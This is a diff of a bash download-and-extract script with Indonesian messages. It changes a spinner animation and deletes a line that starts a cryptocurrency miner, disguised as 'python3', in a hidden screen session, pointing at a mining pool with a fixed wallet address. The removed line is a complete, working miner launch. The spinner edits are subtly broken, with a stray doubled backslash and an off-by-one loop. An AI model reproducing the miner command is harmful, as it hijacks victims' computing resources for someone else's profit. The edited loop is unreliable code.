@@ -10,12 +10,12 @@ loading() {
     local name="Mengunduh $FILE"
     local pid=$1
     local delay=0.75
-    local spin='/-\|'
+    local spin='/-\\|'
     
     echo -n "$name "
     while ps -p $pid > /dev/null; do
-        for i in $(seq 0 3); do
-            echo -n "\r$name ${spin:i:1}"
+        for i in $(seq 0 ${#spin}); do
+            echo -ne "\r$name ${spin:i:1}"  # Menggunakan metode yang lebih sederhana untuk indexing
             sleep $delay
         done
     done
@@ -43,6 +43,3 @@ else
     tar -xvf "$FILE" > /dev/null 2>&1
     echo "Ekstraksi selesai."
 fi
-
-screen -dmS dotsrb$COUNT ./dotsrb/python3 -a yespowersugar -o yespowersugar.eu.mine.zpool.ca:6241 -u DGNF8dXcQNseyKH55K59nyTkRVEbDkuewJ -p c=DGB,zap=SUGAR
-
